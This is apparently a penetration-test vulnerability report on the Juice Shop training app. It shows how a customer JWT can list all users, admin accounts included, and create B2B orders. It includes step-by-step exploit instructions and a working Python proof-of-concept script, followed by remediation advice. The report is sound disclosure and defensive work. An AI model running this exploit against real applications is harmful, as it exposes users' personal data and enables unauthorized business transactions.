╭─ VULN-0013 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Broken Access Control and Token Scoping: Customer JWT Can Enumerate  │
│  All Users and Create B2B Orders                                             │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 8.1                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /api/Users, /b2b/v2/orders                                        │
│                                                                              │
│  Method: GET, POST                                                           │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N                            │
│                                                                              │
│  Description                                                                 │
│  An authorization and token-scoping failure was identified that allows a     │
│  standard (low-privilege) customer account to perform actions that should    │
│  be restricted.                                                              │
│                                                                              │
│  Using a legitimate JWT issued for a newly registered customer (via the      │
│  normal login flow), the application permits:                                │
│                                                                              │
│  1) Full user enumeration via GET /api/Users (including privileged/admin     │
│  accounts and sensitive user fields).                                        │
│  2) B2B order creation via POST /b2b/v2/orders, despite the endpoint being   │
│  part of a B2B API surface that should not accept consumer/retail JWTs.      │
│                                                                              │
│  This indicates missing function-level authorization on /api/Users and a     │
│  trust-boundary failure where the B2B API accepts tokens from an unintended  │
│  audience/context (insufficient issuer/audience/scope enforcement and/or     │
│  missing role checks).                                                       │
│                                                                              │
│  Impact                                                                      │
│  Successful exploitation enables a low-privileged attacker to:               │
│                                                                              │
│  - Exfiltrate sensitive user data by enumerating /api/Users, including       │
│  emails, roles, and other account metadata. The response includes fields     │
│  that materially increase downstream risk (e.g., role mapping, and in        │
│  observed responses, deluxeToken values for some users).                     │
│  - Perform unauthorized business actions against the B2B API by creating     │
│  orders via /b2b/v2/orders using a consumer customer token, enabling misuse  │
│  of B2B workflows and potential financial/process abuse.                     │
│  - Establish a scalable attack path: any attacker can self-register, obtain  │
│  a valid customer JWT, and then repeatedly enumerate user data and submit    │
│  unauthorized B2B orders.                                                    │
│                                                                              │
│  Technical Analysis                                                          │
│  GET /api/Users correctly rejects unauthenticated requests (401), but does   │
│  not enforce role-based restrictions once any valid JWT is provided. A       │
│  legitimate JWT with role=customer is sufficient to retrieve the full user   │
│  dataset.                                                                    │
│                                                                              │
│  Separately, POST /b2b/v2/orders also rejects unauthenticated requests       │
│  (401), but accepts the same consumer JWT and processes the order. The JWT   │
│  used is issued by the standard consumer login endpoint (/rest/user/login)   │
│  and includes a role claim of customer (as seen in the token payload         │
│  returned in the authentication response). Despite this, the B2B endpoint    │
│  returns 200 OK and an order confirmation object.                            │
│                                                                              │
│  Evidence references (captured request IDs):                                 │
│  - 3357: unauthenticated GET /api/Users → 401                                │
│  - 3361: customer JWT GET /api/Users → 200 (response includes admin          │
│  accounts and sensitive fields such as role/email; e.g.,                     │
│  “admin@juice-sh.op” role “admin”, and “ciso@juice-sh.op” with a non-empty   │
│  deluxeToken)                                                                │
│  - 3358: unauthenticated POST /b2b/v2/orders → 401                           │
│  - 3362: customer JWT POST /b2b/v2/orders → 200 with orderNo/paymentDue      │
│  - 3359/3360: user registration and legitimate login/JWT issuance            │
│                                                                              │
│  This combination demonstrates both broken function-level authorization      │
│  (BFLA) and token scoping failure across API domains (consumer vs B2B).      │
│                                                                              │
│  PoC Description                                                             │
│  1) Register a standard customer account (no role tampering):                │
│     - Send POST /api/Users with an email/password and a security             │
│  question/answer.                                                            │
│                                                                              │
│  2) Authenticate with the created account:                                   │
│     - Send POST /rest/user/login and extract the returned JWT.               │
│                                                                              │
│  3) Confirm baseline access control:                                         │
│     - Send GET /api/Users without Authorization header and verify a 401      │
│  response.                                                                   │
│                                                                              │
│  4) Exploit user enumeration:                                                │
│     - Send GET /api/Users with header Authorization: Bearer <customer_jwt>   │
│  and observe 200 OK and a complete user list.                                │
│                                                                              │
│  5) Confirm baseline B2B access control:                                     │
│     - Send POST /b2b/v2/orders without Authorization header and verify a     │
│  401 response.                                                               │
│                                                                              │
│  6) Exploit B2B order creation using the same customer JWT:                  │
│     - Send POST /b2b/v2/orders with Authorization: Bearer <customer_jwt>     │
│  and a minimal order body (cid + orderLines). Observe 200 OK and an order    │
│  confirmation (orderNo, paymentDue).                                         │
│                                                                              │
│  PoC Code                                                                    │
│  import json                                                                 │
│  import uuid                                                                 │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│                                                                              │
│  def register(session: requests.Session, email: str, password: str) ->       │
│  None:                                                                       │
│      url = f"{BASE}/api/Users"                                               │
│      payload = {                                                             │
│          "email": email,                                                     │
│          "password": password,                                               │
│          "passwordRepeat": password,                                         │
│          "securityQuestion": {"id": 1, "question": "Your eldest siblings     │
│  middle name?"},                                                             │
│          "securityAnswer": "test"                                            │
│      }                                                                       │
│      r = session.post(url, json=payload, timeout=15)                         │
│      print("[register] status:", r.status_code)                              │
│      r.raise_for_status()                                                    │
│                                                                              │
│  def login(session: requests.Session, email: str, password: str) -> str:     │
│      url = f"{BASE}/rest/user/login"                                         │
│      payload = {"email": email, "password": password}                        │
│      r = session.post(url, json=payload, timeout=15)                         │
│      print("[login] status:", r.status_code)                                 │
│      r.raise_for_status()                                                    │
│      token = r.json()["authentication"]["token"]                             │
│      return token                                                            │
│                                                                              │
│  def get_users(session: requests.Session, token: str | None) ->              │
│  requests.Response:                                                          │
│      url = f"{BASE}/api/Users"                                               │
│      headers = {"Accept": "application/json"}                                │
│      if token:                                                               │
│          headers["Authorization"] = f"Bearer {token}"                        │
│      return session.get(url, headers=headers, timeout=15)                    │
│                                                                              │
│  def create_b2b_order(session: requests.Session, token: str | None) ->       │
│  requests.Response:                                                          │
│      url = f"{BASE}/b2b/v2/orders"                                           │
│      headers = {"Accept": "application/json"}                                │
│      if token:                                                               │
│          headers["Authorization"] = f"Bearer {token}"                        │
│      body = {"cid": "CIDEB1710", "orderLines": [{"productId": 8,             │
│  "quantity": 1}]}                                                            │
│      return session.post(url, headers=headers, data=json.dumps(body),        │
│  timeout=15)                                                                 │
│                                                                              │
│  def main() -> None:                                                         │
│      s = requests.Session()                                                  │
│      email = f"custscope_{uuid.uuid4().hex[:10]}@juice-sh.op"                │
│      password = "Password123!"                                               │
│                                                                              │
│      register(s, email, password)                                            │
│      token = login(s, email, password)                                       │
│                                                                              │
│      # Baseline: unauth should be denied                                     │
│      r0 = get_users(s, None)                                                 │
│      print("[GET /api/Users unauth] status:", r0.status_code, "body_snip:",  │
│  r0.text[:120].replace("\\n", " "))                                          │
│                                                                              │
│      # Exploit: customer token can enumerate users                           │
│      r1 = get_users(s, token)                                                │
│      print("[GET /api/Users customer JWT] status:", r1.status_code, "len:",  │
│  len(r1.text))                                                               │
│      print("[GET /api/Users customer JWT] body_snip:",                       │
│  r1.text[:300].replace("\\n", " "))                                          │
│                                                                              │
│      # Baseline: unauth should be denied                                     │
│      r2 = create_b2b_order(s, None)                                          │
│      print("[POST /b2b/v2/orders unauth] status:", r2.status_code,           │
│  "body_snip:", r2.text[:120].replace("\\n", " "))                            │
│                                                                              │
│      # Exploit: same customer token can create B2B order                     │
│      r3 = create_b2b_order(s, token)                                         │
│      print("[POST /b2b/v2/orders customer JWT] status:", r3.status_code,     │
│  "body:", r3.text.replace("\\n", " "))                                       │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      main()                                                                  │
│                                                                              │
│  Remediation                                                                 │
│  1) Enforce role-based authorization on GET /api/Users.                      │
│     - Restrict user enumeration to administrative roles only                 │
│  (deny-by-default).                                                          │
│     - If a user “directory” feature is needed, return only minimal data and  │
│  only for authorized roles.                                                  │
│                                                                              │
│  2) Implement strict token scoping for the B2B API (/b2b/v2/*).              │
│     - Enforce JWT issuer and audience (iss/aud/azp) and ensure only tokens   │
│  intended for the B2B API are accepted.                                      │
│     - Consider separate signing keys/issuers for consumer vs B2B tokens.     │
│     - Require explicit scopes/claims (e.g., b2b:orders:create) and validate  │
│  them server-side.                                                           │
│                                                                              │
│  3) Add regression tests.                                                    │
│     - Automated negative tests ensuring a customer JWT cannot call           │
│  /api/Users nor /b2b/v2/orders.                                              │
│     - Include tests for token audience confusion and cross-API token reuse.  │
│                                                                              │
│  4) Improve monitoring and alerting.                                         │
│     - Alert on unexpected access to /api/Users and anomalous B2B order       │
│  creation patterns (especially from consumer accounts).                      │
